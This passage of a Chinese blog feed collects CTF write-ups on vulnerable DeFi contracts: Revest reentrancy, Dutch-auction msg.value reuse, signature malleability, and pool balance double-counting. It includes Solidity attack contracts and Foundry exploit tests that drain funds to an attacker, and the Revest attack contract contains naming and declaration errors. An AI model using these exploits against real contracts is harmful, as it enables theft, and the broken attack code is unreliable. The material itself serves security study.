require(IFNFTHandler(fnftHandler).getBalance(_msgSender(), fnftId) &gt; 0, &quot;E032&quot;);</span><br><span class="line"></span><br><span class="line">      IRevest.LockType lockType = getLockManager().lockTypes(fnftId);</span><br><span class="line">      require(lockType != IRevest.LockType.DoesNotExist, &quot;E007&quot;);</span><br><span class="line">      require(getLockManager().unlockFNFT(fnftId, _msgSender()),&quot;E019&quot;);</span><br><span class="line">      // Burn the FNFTs being exchanged</span><br><span class="line">      burn(_msgSender(), fnftId, quantity);</span><br><span class="line">      getTokenVault().withdrawToken(fnftId, quantity, _msgSender());</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>但是要先知道这话代币的id，这是一个棘手的事，思考题目，我们有一个代币，可以给合约转账</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function depositAdditionalToFNFT(</span><br><span class="line">       uint fnftId,</span><br><span class="line">       uint amount,</span><br><span class="line">       uint quantity</span><br><span class="line">   ) external override returns (uint) &#123;</span><br><span class="line">       IRevest.FNFTConfig memory fnft = getTokenVault().getFNFT(fnftId);</span><br><span class="line">       require(fnftId &lt; getFNFTHandler().getNextId(), &quot;E007&quot;);</span><br><span class="line">       require(quantity &gt; 0, &quot;E070&quot;);</span><br><span class="line"></span><br><span class="line">       address vault = addressesProvider.getTokenVault();</span><br><span class="line">       address handler = addressesProvider.getRevestFNFT();</span><br><span class="line">       address lockHandler = addressesProvider.getLockManager();</span><br><span class="line"></span><br><span class="line">       bool createNewSeries = false;</span><br><span class="line">       &#123;</span><br><span class="line">           uint supply = IFNFTHandler(handler).getSupply(fnftId);</span><br><span class="line"></span><br><span class="line">           uint balance = IFNFTHandler(handler).getBalance(_msgSender(), fnftId);</span><br><span class="line"></span><br><span class="line">           if (quantity &gt; balance) &#123;</span><br><span class="line">               require(quantity == supply, &quot;E069&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">           else if (quantity &lt; balance || balance &lt; supply) &#123;</span><br><span class="line">               createNewSeries = true;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       uint lockId = ILockManager(lockHandler).fnftIdToLockId(fnftId);</span><br><span class="line"></span><br><span class="line">       // Whether to split the new deposits into their own series, or to simply add to an existing series</span><br><span class="line">       uint newFNFTId;</span><br><span class="line">       if(createNewSeries) &#123;</span><br><span class="line">           // Split into a new series</span><br><span class="line">           newFNFTId = IFNFTHandler(handler).getNextId();</span><br><span class="line">           ILockManager(lockHandler).pointFNFTToLock(newFNFTId, lockId);</span><br><span class="line">           burn(_msgSender(), fnftId, quantity);</span><br><span class="line">           IFNFTHandler(handler).mint(_msgSender(), newFNFTId, quantity, &quot;&quot;);</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           // Stay the same</span><br><span class="line">           newFNFTId = 0; // Signals to handleMultipleDeposits()</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // Will call updateBalance</span><br><span class="line">       ITokenVault(vault).depositToken(fnftId, amount, quantity);</span><br><span class="line">       // Now, we transfer to the token vault</span><br><span class="line">       if(fnft.asset != address(0))&#123;</span><br><span class="line">           IERC20(fnft.asset).safeTransferFrom(_msgSender(), vault, quantity * amount);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       ITokenVault(vault).handleMultipleDeposits(fnftId, newFNFTId, fnft.depositAmount + amount);</span><br><span class="line"></span><br><span class="line">       return newFNFTId;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>发现，转账可以mint 新的id,再来看看mint函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function mint(address account, uint id, uint amount, bytes memory data) external override onlyRevestController &#123;</span><br><span class="line">        supply[id] += amount;</span><br><span class="line">        _mint(account, id, amount, data);</span><br><span class="line">        fnftsCreated += 1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>没有想到更新id直接就是+1，所以我们就可以转账代币给合约，更新id,然后再撤回全部代币<br>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier:MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IRevert&#123;</span><br><span class="line">     function withdrawFNFT(uint fnftId, uint quantity) external ;</span><br><span class="line">      function depositAdditionalToFNFT(</span><br><span class="line">        uint fnftId,</span><br><span class="line">        uint amount,</span><br><span class="line">        uint quantity</span><br><span class="line">    ) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">    IRevert revert;</span><br><span class="line">    IREC20 gov;</span><br><span class="line">     address attracker;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _revert,address _gov)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        revert = IRevert(_revert);</span><br><span class="line">        gov =IERC20(_gov);</span><br><span class="line">        attracker = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     function setTrigger(bool _trigger) external &#123;</span><br><span class="line">        triggerCallback = _trigger;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @dev Callback during _mint</span><br><span class="line">    function onERC1155Received(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        uint256 id,</span><br><span class="line">        uint256 value,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external override returns (bytes4) &#123;</span><br><span class="line">        if (triggerCallback) &#123;</span><br><span class="line">            // depositAdditionalToFNFT will call mint again, triggering onERC1155Received</span><br><span class="line">            // we don&#x27;t want this to happen, so we set triggerCallback to false</span><br><span class="line">            triggerCallback=false;</span><br><span class="line">            revest.depositAdditionalToFNFT(1, 1e18, 1); // updates the depositAmount for fnftId=2 to 1e18</span><br><span class="line">            revest.withdrawFNFT(2, 100_001); // withdraw 100_001 from fnftId=2</span><br><span class="line">            gov.transfer(attacker,gov.balanceOf(address(this))); // send GOV tokens to attacker</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return bytes4(keccak256(&quot;onERC1155Received(address,address,uint256,uint256,bytes)&quot;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onERC1155BatchReceived(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        uint256[] calldata ids,</span><br><span class="line">        uint256[] calldata values,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external override returns (bytes4) &#123;</span><br><span class="line">        return bytes4(0); // not accepted</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个题的原型，可以看看<a href="https://rekt.news/revest-finance-rekt/">点击</a>;<br>测试合约也可以看看;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// utilities</span><br><span class="line">import &#123;Test&#125; from &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &#123;console&#125; from &quot;forge-std/console.sol&quot;;</span><br><span class="line">// core contracts</span><br><span class="line">import &#123;Token&#125; from &quot;src/other/Token.sol&quot;;</span><br><span class="line">import &#123;Revest&#125; from &quot;src/degen-jackpot/Revest.sol&quot;;</span><br><span class="line">import &#123;LockManager&#125; from &quot;src/degen-jackpot/LockManager.sol&quot;;</span><br><span class="line">import &#123;TokenVault&#125; from &quot;src/degen-jackpot/TokenVault.sol&quot;;</span><br><span class="line">import &#123;FNFTHandler&#125; from &quot;src/degen-jackpot/FNFTHandler.sol&quot;;</span><br><span class="line">import &#123;AddressRegistry&#125; from &quot;src/degen-jackpot/OtherContracts.sol&quot;;</span><br><span class="line">import &#123;IRevest&#125; from &quot;src/degen-jackpot/OtherInterfaces.sol&quot;;</span><br><span class="line"></span><br><span class="line">import &#123;RevestExploiter&#125; from &quot;src/degen-jackpot/RevestExploiter.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Testing is Test &#123;</span><br><span class="line"></span><br><span class="line">    address attacker = makeAddr(&#x27;attacker&#x27;);</span><br><span class="line">    address o1 = makeAddr(&#x27;o1&#x27;);</span><br><span class="line">    address o2 = makeAddr(&#x27;o2&#x27;);</span><br><span class="line">    address admin = makeAddr(&#x27;admin&#x27;); // should not be used</span><br><span class="line">    address adminUser = makeAddr(&#x27;adminUser&#x27;); // should not be used</span><br><span class="line"></span><br><span class="line">    Token gov;</span><br><span class="line">    Revest revest;</span><br><span class="line">    LockManager lockManager;</span><br><span class="line">    TokenVault tokenVault;</span><br><span class="line">    FNFTHandler fnftHandler;</span><br><span class="line">    AddressRegistry addressRegistry;</span><br><span class="line"></span><br><span class="line">    /// preliminary state</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line"></span><br><span class="line">        // funding accounts</span><br><span class="line">        vm.deal(admin, 10_000 ether);</span><br><span class="line">        vm.deal(attacker, 10_000 ether);</span><br><span class="line">        vm.deal(adminUser, 10_000 ether);</span><br><span class="line"></span><br><span class="line">        // deploying token contract</span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        gov = new Token(&#x27;GOV&#x27;,&#x27;GOV&#x27;);</span><br><span class="line"></span><br><span class="line">        address[] memory addresses = new address[](2);</span><br><span class="line">        uint256[] memory amounts = new uint256[](2);</span><br><span class="line"></span><br><span class="line">        addresses[0]=adminUser; addresses[1]=attacker;</span><br><span class="line">        amounts[0]=100_000e18; amounts[1]=1e18;</span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        gov.mintPerUser(addresses,amounts);</span><br><span class="line"></span><br><span class="line">        // deploying core contracts</span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        addressRegistry = new AddressRegistry();</span><br><span class="line"></span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        revest = new Revest(address(addressRegistry));</span><br><span class="line"></span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        lockManager = new LockManager(address(addressRegistry));</span><br><span class="line"></span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        tokenVault = new TokenVault(address(addressRegistry));</span><br><span class="line"></span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        fnftHandler = new FNFTHandler(address(addressRegistry));</span><br><span class="line"></span><br><span class="line">        vm.startPrank(admin);</span><br><span class="line">        addressRegistry.setLockManager(address(lockManager));</span><br><span class="line">        addressRegistry.setTokenVault(address(tokenVault));</span><br><span class="line">        addressRegistry.setRevestFNFT(address(fnftHandler));</span><br><span class="line">        addressRegistry.setRevest(address(revest));</span><br><span class="line">        vm.stopPrank();</span><br><span class="line"></span><br><span class="line">        // --adminUser deposits GOV token into Revest vault</span><br><span class="line">        vm.prank(adminUser);</span><br><span class="line">        gov.approve(address(revest),100_000e18);</span><br><span class="line"></span><br><span class="line">        address[] memory recipients = new address[](1);</span><br><span class="line">        recipients[0]=adminUser;</span><br><span class="line">        uint256[] memory quantities = new uint256[](1);</span><br><span class="line">        quantities[0]=100;</span><br><span class="line">        bytes memory arguments;</span><br><span class="line"></span><br><span class="line">        IRevest.FNFTConfig memory fnftConfig;</span><br><span class="line">        fnftConfig.asset = address(gov);</span><br><span class="line">        fnftConfig.depositAmount=1_000e18;</span><br><span class="line"></span><br><span class="line">        vm.prank(adminUser);</span><br><span class="line">        revest.mintAddressLock(</span><br><span class="line">            adminUser,</span><br><span class="line">            arguments,</span><br><span class="line">            recipients,</span><br><span class="line">            quantities,</span><br><span class="line">            fnftConfig</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// solves the challenge</span><br><span class="line">    function testChallengeExploit() public &#123;</span><br><span class="line">        vm.startPrank(attacker,attacker);</span><br><span class="line"></span><br><span class="line">        RevestExploiter exploiter = new RevestExploiter(address(revest),address(gov));</span><br><span class="line"></span><br><span class="line">        address[] memory recipients = new address[](1);</span><br><span class="line">        recipients[0]=address(exploiter);</span><br><span class="line">        uint256[] memory quantities = new uint256[](1);</span><br><span class="line">        quantities[0]=2;</span><br><span class="line">        bytes memory arguments;</span><br><span class="line"></span><br><span class="line">        IRevest.FNFTConfig memory fnftConfig;</span><br><span class="line">        fnftConfig.asset = address(gov);</span><br><span class="line"></span><br><span class="line">        revest.mintAddressLock( // fnftId=1</span><br><span class="line">            address(exploiter),</span><br><span class="line">            arguments,</span><br><span class="line">            recipients,</span><br><span class="line">            quantities,</span><br><span class="line">            fnftConfig</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        gov.transfer(address(exploiter),1e18);</span><br><span class="line">        exploiter.setTrigger(true);</span><br><span class="line"></span><br><span class="line">        quantities[0]=100_001;</span><br><span class="line"></span><br><span class="line">        revest.mintAddressLock( // fnftId=2</span><br><span class="line">            address(exploiter),</span><br><span class="line">            arguments,</span><br><span class="line">            recipients,</span><br><span class="line">            quantities,</span><br><span class="line">            fnftConfig</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        validation();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// expected final state</span><br><span class="line">    function validation() public &#123;</span><br><span class="line"></span><br><span class="line">        // attacker acquires all GOV tokens that were deposited into the Revest contract</span><br><span class="line">        assertEq(gov.balanceOf(address(tokenVault)),0);</span><br><span class="line">        assertEq(gov.balanceOf(attacker),100_001e18);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完结；<br>补充：</p><ul><li><p>mintAddressLock 函数的主要作用是创建一个新的 FNFT，并为其设置一个地址锁，这样只有特定的地址才能解锁这些 FNFT。这使得 FNFT 可以与特定的条件绑定，提供更复杂的锁定和解锁机制，增强了合约的灵活性和安全性。</p></li><li><p>address trigger: 触发锁定解除的地址。当满足某些条件时，这个地址将能够解锁对应的 FNFT。</p></li><li><p>bytes memory arguments: 用于传递其他可能需要的参数，具体用途取决于实现。</p></li><li><p>address[] memory recipients: 接收 FNFT 的地址数组。</p></li><li><p>uint[] memory quantities: 对应每个接收地址的 FNFT 数量数组。<br>IRevest.FNFTConfig memory fnftConfig: FNFT 的配置，包括资产类型和存款金额等。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-opyn-sesame</title>
      <link href="/2024/10/30/CTF-opyn-sesame/"/>
      <url>/2024/10/30/CTF-opyn-sesame/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-opyn-sesame"><a href="#CTF-opyn-sesame" class="headerlink" title="CTF-opyn-sesame"></a>CTF-opyn-sesame</h1><p>题目源代码：<a href="">点击</a></p><p>要求是：获得合约中所有的余额</p><p>和之前那个看涨期权有点像，这个是看跌期权，所还是的对这个股市的一些专有的词一些理解，这篇文章写的很好<a href="https://xueqiu.com/6489791900/299846807">点击</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>capture the ether</title>
      <link href="/2024/10/30/capture-the-ether/"/>
      <url>/2024/10/30/capture-the-ether/</url>
      
        <content type="html"><![CDATA[<p>对于随机数，来实现一个更好的理解。</p><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>第一个很简单，答案直接告诉你了，输入即可</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>第二个，暴力破解，关键就是uint8,一个字节的符号，范围0-127，直接暴力破解，循环</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>第三个，有一些拆分，由于哈希计算的是当前的时间戳，所以我们直接引用它的计算哈希的表达式就行了，写一个攻击合约，在同一笔交易中进行就可以了</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>第四个，就要使用控制台了，查询当前的密码，然后输入就可以了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Extractoor</title>
      <link href="/2024/10/28/CTF-Extractoor/"/>
      <url>/2024/10/28/CTF-Extractoor/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Etractoor"><a href="#CTF-Etractoor" class="headerlink" title="CTF-Etractoor"></a>CTF-Etractoor</h1><p>题目源代码：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/extractoor">点击</a></p><p>题目要求：<br>已经启动了一场荷兰拍卖，以出售 1_000_000 个 FARM 代币。到目前为止，一个 degen 已经投入了 900 ETH。</p><p>您的任务是从 DutchAuction 合约中窃取至少 90% 的 ETH。</p><p>这次合约就只有一个，实现的是荷兰拍卖，我们要获取eth，所以我们就先看合约中，那个地方可以获得eth,<br>发现commitETH合约中，能够返回eth,</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function commitEth(address payable _beneficiary) public payable nonReentrant</span><br><span class="line">  &#123;</span><br><span class="line">      // Get ETH able to be committed</span><br><span class="line">      uint256 ethToTransfer = calculateCommitment(msg.value);</span><br><span class="line"></span><br><span class="line">      /// @notice Accept ETH Payments.</span><br><span class="line">      uint256 ethToRefund = msg.value - ethToTransfer;</span><br><span class="line">      if (ethToTransfer &gt; 0) &#123;</span><br><span class="line">          _addCommitment(_beneficiary, ethToTransfer);</span><br><span class="line">      &#125;</span><br><span class="line">      /// @notice Return any ETH to be refunded.</span><br><span class="line">      if (ethToRefund &gt; 0) &#123;</span><br><span class="line">          _beneficiary.transfer(ethToRefund);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这个合约就是获得用户承诺的金额，计算最大的承诺上限，然后再与用户承诺金额比较，计算退回的eth.</p><p>还有就只再最后结算的时候，如果拍卖部成功，也会退回金额</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdrawTokens(address beneficiary) public nonReentrant &#123;</span><br><span class="line">      if (auctionSuccessful()) &#123;</span><br><span class="line">          require(marketStatus.finalized, &quot;DutchAuction: not finalized&quot;);</span><br><span class="line">          /// @dev Successful auction! Transfer claimed tokens.</span><br><span class="line">          uint256 tokensToClaim = tokensClaimable(beneficiary);</span><br><span class="line">          require(tokensToClaim &gt; 0, &quot;DutchAuction: No tokens to claim&quot;); </span><br><span class="line">          claimed[beneficiary] = claimed[beneficiary]+tokensToClaim;</span><br><span class="line">          IERC20(auctionToken).safeTransfer(beneficiary,tokensToClaim);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">          /// @dev Auction did not meet reserve price.</span><br><span class="line">          /// @dev Return committed funds back to user.</span><br><span class="line">          require(block.timestamp &gt; marketInfo.endTime, &quot;DutchAuction: auction has not finished yet&quot;);</span><br><span class="line">          uint256 fundsCommitted = commitments[beneficiary];</span><br><span class="line">          commitments[beneficiary] = 0; // Stop multiple withdrawals and free some gas</span><br><span class="line"></span><br><span class="line">          (bool success,) = payable(beneficiary).call&#123;value:fundsCommitted&#125;(&#x27;&#x27;);</span><br><span class="line">          require(success, &#x27;ETH_TRANSFER_FAILED&#x27;);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>但是这个函数再finalize函数中才能被使用，而且还只能是管理者身份调用，所以就考虑commitETH函数</p><p>合约本身开头就实现了一个可以多个回调的函数，说明这里是个突破口，然后仔细发现commintETH函数，一直使用的msg.value,如果我们能重复使用这个msg.value就可以重复的使用commintETH,退回更多的eth，为自己创造利润。</p><p>这个题就解决了<br>这个是题解中一部分测试代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/// solves the challenge</span><br><span class="line">  function testChallengeExploit() public &#123;</span><br><span class="line">      vm.startPrank(attacker,attacker);</span><br><span class="line"></span><br><span class="line">      bytes memory singleCall = abi.encodeWithSignature(&quot;commitEth(address)&quot;,attacker);</span><br><span class="line">      bytes[] memory data = new bytes[](11);</span><br><span class="line"></span><br><span class="line">      for (uint i; i&lt;11; ++i) &#123;</span><br><span class="line">          data[i] = singleCall;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      bytes memory multiCall = abi.encodeWithSignature(&quot;multicall(bytes[])&quot;,data);</span><br><span class="line">      address(dutchAuction).call&#123;value:98e18&#125;(multiCall);</span><br><span class="line"></span><br><span class="line">      vm.stopPrank();</span><br><span class="line">      validation();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>(还是的了解怎么写代码，不要只知道思路，call的用法要记住)</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-malleable</title>
      <link href="/2024/10/28/CTF-malleable/"/>
      <url>/2024/10/28/CTF-malleable/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-malleable"><a href="#CTF-malleable" class="headerlink" title="CTF-malleable"></a>CTF-malleable</h1><p>题目源代码：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/malleable">点击</a></p><p>题目要求是：<br>您一直在黑暗的森林中嗅探，并发现了 TreasureVault 合同。它需要合约所有者的验证签名才能提取选定数量的 ETH。</p><p>您已经记录了用户在之前的 tx 中用于提取一些 ETH 的签名。</p><p>耗尽剩余的合约资金。</p><p>首先先里了解一下签名，这是我有学到的一个新知识。</p><h1 id="签名结构"><a href="#签名结构" class="headerlink" title="签名结构"></a>签名结构</h1><p>v、r 和 s 是以太坊签名的三个组成部分。签名用于验证消息的来源和内容。<br>v 是恢复标识符，通常为 27 或 28，表示签名的版本。<br>r 和 s 是签名的输出，用于确保消息未被篡改。</p><h1 id="签名的生成"><a href="#签名的生成" class="headerlink" title="签名的生成"></a>签名的生成</h1><p>签名包含三个部分：r、s 和 v。<br>r 和 s 是椭圆曲线的点，而 v 表示恢复标识符。<br>计算 s：<br>当生成签名时，消息哈希（通常是交易或信息的哈希）会被用于计算 r 和 s。<br>签名的 s 值通常会在 0 到曲线的参数 n 之间，因此在椭圆曲线中，s 值是可以被认为是模反的。<br>攻击者如何计算 s</p><h2 id="模反性："><a href="#模反性：" class="headerlink" title="模反性："></a>模反性：</h2><p>在椭圆曲线中，存在一个性质，允许将 s 值“反转”。具体来说，对于一个有效的 s，存在另一个有效的 s_，使得 s + s_ ≡ n（模 n），其中 n 是椭圆曲线的一个参数。<br>因此，攻击者可以通过计算：<br>𝑠&#x3D;𝑛−𝑠<br>这里的 n 是 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141，这是 secp256k1 曲线的阶。</p><blockquote><p>它是 secp256k1 曲线的阶（order）。在椭圆曲线密码学中，曲线的阶是指可以在该曲线上生成的点的数量。具体来说：曲线阶 n：ecp256k1 曲线的阶为 n &#x3D;0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141，这是一个非常大的素数。这个值是由 secp256k1 标准定义的，适用于比特币和以太坊等区块链。</p></blockquote><p>模运算的性质：<br>在使用这个曲线时，签名的 s 值通常会在 0 到 n-1 之间。如果 s 超过 n，则会被模运算处理。<br>由于签名可以用不同的 s 值表示同一条消息，因此攻击者可以通过计算 s_ &#x3D; n - s 来生成一个有效的替代签名。</p><h2 id="生成伪造签名："><a href="#生成伪造签名：" class="headerlink" title="生成伪造签名："></a>生成伪造签名：</h2><p> 攻击者将 s 替换为 s_，从而生成一个伪造的签名。此时，v 也可以根据需要调整，以确保签名的有效性。<br>伪造的签名仍然会通过合约的验证，因为它仍然与相同的消息哈希相对应（只是用不同的 s 值）。</p><h2 id="为什么有效"><a href="#为什么有效" class="headerlink" title="为什么有效"></a>为什么有效</h2><p>当合约验证签名时，它只需要确认 r 和 s 是否对应于给定的消息（即哈希）。<br>由于 s_ 和 s 是通过模反得到的，它们仍然是有效的签名，合约将接受它，认为攻击者是有效的请求者。</p><p>所以我们只需要使用s_构造一个假签名就可以了。然后直接实现取款。<br>这是测试合约的一部分：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/// solves the challenge</span><br><span class="line">   function testChallengeExploit() public &#123;</span><br><span class="line">       vm.startPrank(attacker,attacker);</span><br><span class="line"></span><br><span class="line">       uint8 v_ = v == 27 ? 28 : 27;</span><br><span class="line">       bytes32 s_ = bytes32(</span><br><span class="line">           uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - </span><br><span class="line">           uint256(s)</span><br><span class="line">       );</span><br><span class="line"></span><br><span class="line">       treasureVault.sendFundsWithAuth(1e18,0,v_,r,s_);</span><br><span class="line"></span><br><span class="line">       vm.stopPrank();</span><br><span class="line">       validation();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Side-Entrance</title>
      <link href="/2024/10/28/CTF-Side-Entrance/"/>
      <url>/2024/10/28/CTF-Side-Entrance/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Side-Entrance"><a href="#CTF-Side-Entrance" class="headerlink" title="CTF-Side-Entrance"></a>CTF-Side-Entrance</h1><p>题目源代码：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/side-entrance">点击</a></p><p>题目要求：<br>有一个 CallOptions 合约，允许用户创建备兑 wETH-USDC 看涨期权。</p><p>他们甚至提供了 functionality 允许用户通过使用 Uniswap 闪电贷在没有任何资金的情况下执行他们购买的期权。</p><p>您的任务是窃取至少 90k USDC。您开始没有资金。</p><p>断更中，关于闪电贷加流动性的题真的很难，准备把uinswap家族学完了再来解题。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-safu-swapper</title>
      <link href="/2024/10/27/CTF-safu-swapper/"/>
      <url>/2024/10/27/CTF-safu-swapper/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-safu-swapper"><a href="#CTF-safu-swapper" class="headerlink" title="CTF-safu-swapper"></a>CTF-safu-swapper</h1><p>题目源代码：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/safu-swapper">点击</a></p><p>题目要求：还是获得pool池的全部代币</p><p>这题合约，有俩个，一个主要实现计算，一个主要实现流动性池，<br>首先主要就是看合约流动性提供者，怎样改变流动性，是否有漏洞，果然被发现在移除流动性，发现使用的是 <code> uint amount = IERC20(token).balanceOf(pool);</code> <code> return (amount.mul(units)).div(totalSupply);</code> 而我们在Safupool合约中，并没有发现能改变 <code>baseAmount</code>，<code>tokenAmount</code>,换句话来说，就是在我们以<code>transfer</code>转入代币时合约不会更新<code>baseAmount</code>，<code>tokenAmount</code>，实际上合约是通过 <code>uint amount = IERC20(token).balanceOf(pool);</code>来计算份额，pool会认为已经收到了转账。<br>而增加流动性是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function addLiquidity(uint256 _baseAmount, uint256 _tokenAmount) public returns (uint liquidityUnits) &#123;</span><br><span class="line">       IERC20(BASE).transferFrom(msg.sender,address(this),_baseAmount);</span><br><span class="line">       IERC20(TOKEN).transferFrom(msg.sender,address(this),_tokenAmount);</span><br><span class="line">       liquidityUnits = addLiquidityForMember(msg.sender);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>移除流动性：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function removeAllLiquidity() public returns (uint outputBase, uint outputToken) &#123;</span><br><span class="line">        transfer(address(this),balanceOf(msg.sender)); // transfer all LP units for withdrawing liq</span><br><span class="line">        return removeLiquidityForMember(msg.sender);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>举个例子：<br>假设pooL中有俩个代币，usdc,token;</p><ul><li>usdc :1000</li><li>token :1000</li><li>你的lp ；100<br>然后你向这个pool中转入代币增加流动性，<br>理想上是这样的：</li><li>usdc :1100</li><li>token :1100</li><li>你的lp :110<br>但是由于baseamount,tokenamount,并没有更新<br>所以pool虽然增加了，但是内部状态并没有更新，实际上是这样的：</li><li>usdc:1100</li><li>token:1100</li><li>你的lp :100<br>然后在移除流动性的时候，它是计算的是实际的，移除流动性时，是按照usdc&#x3D;1100,token&#x3D;1100来计算的，然后我们就能获得更多的代币，如果我们重新增添流动性，由于合约中未更新状态，所以刚刚转的100代币，会误以为给攻击者增加lp代币，然后攻击者就再次利用这个lp获得更多的代币。通用名词，双重计算。</li></ul><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface IUniswapV2Pair &#123;</span><br><span class="line">    function swap(</span><br><span class="line">        uint amount0Out, </span><br><span class="line">        uint amount1Out, </span><br><span class="line">        address to, </span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface ISafuPool &#123;</span><br><span class="line">    function addLiquidity(uint256 _baseAmount, uint256 _tokenAmount) external returns (uint);</span><br><span class="line">    function swap(address toToken, uint256 